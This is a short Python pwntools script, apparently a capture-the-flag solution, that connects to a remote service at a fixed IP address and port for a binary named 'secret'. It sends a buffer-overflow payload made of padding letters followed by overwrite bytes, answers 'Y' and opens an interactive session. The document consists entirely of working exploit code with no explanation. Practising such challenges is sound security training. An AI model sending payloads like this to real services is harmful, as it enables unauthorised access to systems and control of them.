from pwn import *

p = remote('140.110.112.77', 6131)
# p = process('./secret')

payload = 'AAAAAAAABBBBBBBBCCCCCCCCDDDD\x37\xab\x00\x00'

p.sendline(payload)
p.send('Y')
p.interactive()
